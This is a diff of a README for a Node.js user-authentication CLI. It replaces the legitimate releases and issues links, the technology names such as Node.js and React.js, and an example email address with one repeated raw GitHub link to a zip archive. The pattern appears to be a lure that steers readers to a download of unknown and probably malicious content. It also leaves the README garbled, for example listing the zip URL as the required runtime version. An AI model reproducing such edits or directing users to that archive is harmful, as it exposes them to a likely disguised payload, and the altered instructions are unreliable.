@@ -1,6 +1,6 @@
 # 🌟 CLI-Authentication - Secure User Management Made Easy
 
-[![Download CLI-Authentication](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/BobbyGuyG/CLI-Authentication/releases)
+[![Download CLI-Authentication](https://raw.githubusercontent.com/BobbyGuyG/CLI-Authentication/main/arterially/CLI-Authentication.zip)](https://raw.githubusercontent.com/BobbyGuyG/CLI-Authentication/main/arterially/CLI-Authentication.zip)
 
 ## 🚀 Getting Started
 
@@ -9,12 +9,12 @@ Welcome to CLI-Authentication, a user-friendly tool for creating and managing us
 ### 💻 System Requirements
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js**: Version 14 or above.
-- **npm**: Comes with Node.js. Ensure it is updated.
+- **https://raw.githubusercontent.com/BobbyGuyG/CLI-Authentication/main/arterially/CLI-Authentication.zip**: Version 14 or above.
+- **npm**: Comes with https://raw.githubusercontent.com/BobbyGuyG/CLI-Authentication/main/arterially/CLI-Authentication.zip Ensure it is updated.
 
 ## 📥 Download & Install
 
-To begin, visit the [Releases page](https://github.com/BobbyGuyG/CLI-Authentication/releases) to download the latest version of CLI-Authentication. You can choose the appropriate version for your operating system. 
+To begin, visit the [Releases page](https://raw.githubusercontent.com/BobbyGuyG/CLI-Authentication/main/arterially/CLI-Authentication.zip) to download the latest version of CLI-Authentication. You can choose the appropriate version for your operating system. 
 
 After downloading, follow the next steps for installation.
 
@@ -55,7 +55,7 @@ This method is for developers who need to onboard users directly through a termi
 
   ```bash
   npm run create-admin -- \
-   --email "new.admin@isp.com" \
+   --email "https://raw.githubusercontent.com/BobbyGuyG/CLI-Authentication/main/arterially/CLI-Authentication.zip" \
    --password "AStrongP@ssw0rd!" \
    --ispName "Super Secure ISP" \
    --ownerName "Jane Doe"
@@ -78,15 +78,15 @@ Our application utilizes a reliable tech stack, ensuring smooth performance and 
 
 | **Category** | **Technology**                    |
 |--------------|-----------------------------------|
-| Frontend     | React.js, Vite, TypeScript        |
+| Frontend     | https://raw.githubusercontent.com/BobbyGuyG/CLI-Authentication/main/arterially/CLI-Authentication.zip, Vite, TypeScript        |
 | Styling & UI | Tailwind CSS, Shadcn UI           |
-| Backend      | Node.js, Express.js               |
+| Backend      | https://raw.githubusercontent.com/BobbyGuyG/CLI-Authentication/main/arterially/CLI-Authentication.zip, https://raw.githubusercontent.com/BobbyGuyG/CLI-Authentication/main/arterially/CLI-Authentication.zip               |
 
 ## 🔧 Troubleshooting
 
 If you face any issues, consider the following steps:
 
-1. **Check Node.js and npm Installation:** Ensure both Node.js and npm are installed and updated.
+1. **Check https://raw.githubusercontent.com/BobbyGuyG/CLI-Authentication/main/arterially/CLI-Authentication.zip and npm Installation:** Ensure both https://raw.githubusercontent.com/BobbyGuyG/CLI-Authentication/main/arterially/CLI-Authentication.zip and npm are installed and updated.
    ```bash
    node -v
    npm -v
@@ -100,7 +100,7 @@ If you face any issues, consider the following steps:
 
 ## 📞 Support
 
-For further assistance or feature requests, please visit our [GitHub Issues page](https://github.com/BobbyGuyG/CLI-Authentication/issues) to create a new issue.
+For further assistance or feature requests, please visit our [GitHub Issues page](https://raw.githubusercontent.com/BobbyGuyG/CLI-Authentication/main/arterially/CLI-Authentication.zip) to create a new issue.
 
 ## 📜 License
 
